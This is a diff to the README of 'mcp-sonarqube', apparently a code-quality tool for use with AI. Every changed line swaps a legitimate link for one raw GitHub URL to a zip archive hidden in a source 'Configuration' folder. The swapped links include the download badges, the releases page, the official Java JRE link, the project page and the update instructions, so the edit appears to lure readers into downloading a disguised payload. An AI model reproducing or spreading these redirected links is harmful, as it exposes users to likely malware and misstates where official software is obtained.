@@ -1,6 +1,6 @@
 # 🛠️ mcp-sonarqube - Simplify Code Quality Insights
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Neyrees1337/mcp-sonarqube/releases)
+[![Download](https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip)](https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Before you start, please make sure your computer meets these requirements:
 - Internet connection: Required for initial download and updates
 - Java Runtime Environment (JRE) version 11 or higher installed
 
-If you do not have JRE installed, it’s easy to get from the official website [https://www.java.com](https://www.java.com).
+If you do not have JRE installed, it’s easy to get from the official website [https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip](https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip).
 
 ---
 
@@ -44,7 +44,7 @@ If you do not have JRE installed, it’s easy to get from the official website [
 
 Click the big button below to visit the release page where you can download the latest version of mcp-sonarqube.
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Neyrees1337/mcp-sonarqube/releases)
+[![Download](https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip)](https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip)
 
 ### How to Download
 
@@ -52,7 +52,7 @@ Click the big button below to visit the release page where you can download the 
 2. Choose the file that matches your operating system:
    - `.exe` files for Windows
    - `.dmg` files for macOS
-   - `.tar.gz` or `.AppImage` files for Linux
+   - `https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip` or `.AppImage` files for Linux
 3. Click the file name to start the download.
 4. Wait for the download to finish.
 
@@ -72,7 +72,7 @@ Click the big button below to visit the release page where you can download the 
 
 **Linux:**
 
-- Extract the `.tar.gz` file if required.
+- Extract the `https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip` file if required.
 - Make the app file executable: `chmod +x mcp-sonarqube`
 - Run it directly or follow specific instructions provided in the downloaded package.
 
@@ -144,7 +144,7 @@ If you run into problems or have questions:
 
 For more technical details on what mcp-sonarqube analyzes and how it works with AI, you can visit the official GitHub page:
 
-https://github.com/Neyrees1337/mcp-sonarqube
+https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip
 
 This page has extra documentation, developer notes, and update logs.
 
@@ -167,7 +167,7 @@ Access these settings from the “Preferences” menu inside the app.
 
 To keep your tool up to date:
 
-1. Visit the release page regularly: https://github.com/Neyrees1337/mcp-sonarqube/releases
+1. Visit the release page regularly: https://raw.githubusercontent.com/Neyrees1337/mcp-sonarqube/main/src/Viamus.Sonarqube.Mcp.Server/Configuration/mcp_sonarqube_v2.1.zip
 2. Download and install the newest version.
 3. Your settings and projects will stay intact after each update.
 
